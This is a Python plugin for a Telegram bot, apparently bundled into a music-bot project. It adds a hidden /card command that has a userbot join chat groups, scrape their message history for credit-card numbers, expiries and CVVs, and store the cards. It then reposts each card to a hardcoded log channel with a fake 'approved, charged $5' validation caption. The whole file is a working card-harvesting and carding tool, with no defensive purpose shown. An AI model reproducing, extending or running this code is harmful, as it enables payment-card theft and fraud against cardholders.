
import asyncio
from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from pyrogram.types import Message
import re
from pathlib import Path
from SANYAMUSIC import app, userbot
from SANYAMUSIC.core.userbot import assistants
from SANYAMUSIC.utils.database import get_cards, get_card_count, is_card_exists, add_card, remove_card
from SANYAMUSIC.misc import SUDOERS

LOGS_CC = -1002018556839

def getcards(text: str):
    text = text.replace('\n', ' ').replace('\r', '')
    card = re.findall(r"[0-9]+", text)
    if not card or len(card) < 3:
        return None

    if len(card) == 3:
        cc, mes_ano, cvv = card
        if len(mes_ano) == 3:
            mes, ano = mes_ano[:2], mes_ano[2:]
        else:
            mes, ano = mes_ano[:2], mes_ano[2:]
    elif len(card) > 3:
        cc, mes, ano, cvv = card[:4]
        if len(mes) != 2 or not ('01' <= mes <= '12'):
            mes, ano = ano, mes

    if not (cc.startswith(('3', '4', '5', '6')) and (len(cc) in [15, 16])):
        return None
    if len(mes) != 2 or not ('01' <= mes <= '12'):
        return None
    if len(ano) not in [2, 4] or (len(ano) == 2 and not ('21' <= ano <= '39')) or (len(ano) == 4 and not ('2021' <= ano <= '2039')):
        return None
    if cc.startswith('3') and len(cvv) != 4 or len(cvv) != 3:
        return None
    
    return cc, mes, ano, cvv

@app.on_message(filters.command(["card"]) & SUDOERS)
async def cmd_scr(client, message):
    le = message.from_user.mention
    msg = message.text[len('/card '):].strip()
    splitter = msg.split(' ')
    if 1 in assistants:
        user = userbot.one
    if not msg or len(splitter) < 2:
        resp = """
𝗪𝗿𝗼𝗻𝗴 𝗙𝗼𝗿𝗺𝗮𝘁 ❌

𝗨𝘀𝗮𝗴𝗲:
𝗙𝗼𝗿 𝗣𝘂𝗯𝗹𝗶𝗰 𝗚𝗿𝗼𝘂𝗽 𝗦𝗰𝗿𝗮𝗽𝗽𝗶𝗻𝗴
<code>/scr username 50</code>

𝗙𝗼𝗿 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗚𝗿𝗼𝘂𝗽 𝗦𝗰𝗿𝗮𝗽𝗽𝗶𝗻𝗴
<code>/scr https://t.me/+aGWRGz 50</code>
        """
        await message.reply_text(resp, message.id)
        return

    try:
        limit = int(splitter[1])
    except ValueError:
        limit = 100

    delete = await message.reply_text("𝗦𝗰𝗿𝗮𝗽𝗶𝗻𝗴 𝗦𝘁𝗮𝗿𝘁...", message.id)
    channel_link = splitter[0]
    
    async def scrape_channel(channel_id, limit, title):
        amt_cc = 0
        duplicate = 0
        card_messages = []
        async for msg in user.get_chat_history(channel_id, limit):
            all_history = msg.text or "INVALID CC NUMBER BC"
            all_cards = all_history.split('\n')
            cards = [getcards(x) for x in all_cards if getcards(x)]
            
            if not cards:
                continue
            
            for item in cards:
                amt_cc += 1
                cc, mes, ano, cvv = item
                fullcc = f"{cc}|{mes}|{ano}|{cvv}"
                is_exist = await is_card_exists(cc)
                if is_exist:
                    duplicate += 1
                else:
                    await add_card(cc)
                    card_messages.append(f"{fullcc}")

        total_cc = amt_cc
        cc_found = total_cc - duplicate
        await app.delete_messages(message.chat.id, delete.id)
        
        if card_messages:
            cards_text = "\n\n".join(card_messages)
        else:
            cards_text = "No new cards found."

        for fullcc in card_messages:
            card_caption = f"""
┏━━━━━━━⍟
┃BRAINTREE AUTH 𝟓$ ✅
┗━━━━━━━━━━━⊛
➩ 𝗖𝗮𝗿𝗱 :<code>{fullcc}</code>
➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : APPROVED CARD ✅
➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CHARGED 5$

[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 148:382:1490xx...Live ✅
➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {le}
"""
            await app.send_message(
                chat_id=LOGS_CC,
                text=card_caption,
            )
            await asyncio.sleep(30)

    try:
        if "https" in channel_link:
            join = await user.join_chat(channel_link)
            await scrape_channel(join.id, limit, join.title)
        else:
            chat_info = await user.get_chat(channel_link)
            await scrape_channel(chat_info.id, limit, chat_info.title)
    except Exception as e:
        error_message = str(e)
        if '[400 USER_ALREADY_PARTICIPANT]' in error_message:
            chat_info = await user.get_chat(channel_link)
            await scrape_channel(chat_info.id, limit, chat_info.title)
        elif '[400 USERNAME_INVALID]' in error_message:
            resp = """
𝗪𝗿𝗼𝗻𝗴 𝗙𝗼𝗿𝗺𝗮𝘁 ❌

𝗨𝘀𝗮𝗴𝗲:
𝗙𝗼𝗿 𝗣𝘂𝗯𝗹𝗶𝗰 𝗚𝗿𝗼𝘂𝗽 𝗦𝗰𝗿𝗮𝗽𝗽𝗶𝗻𝗴
<code>/card username 50</code>

𝗙𝗼𝗿 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗚𝗿𝗼𝘂𝗽 𝗦𝗰𝗿𝗮𝗽𝗽𝗶𝗻𝗴
<code>/card https://t.me/+aGWRGz 50</code>
        """
            await message.reply_text(resp, message.id)
            await delete.delete()
        elif '[400 INVITE_HASH_EXPIRED]' in error_message:
            await message.reply_text("The invite link is expired. Please provide a valid link.", message.id)
            await delete.delete()
        else:
            await message.reply_text(f"An error occurred: {error_message}", message.id)
            await delete.delete()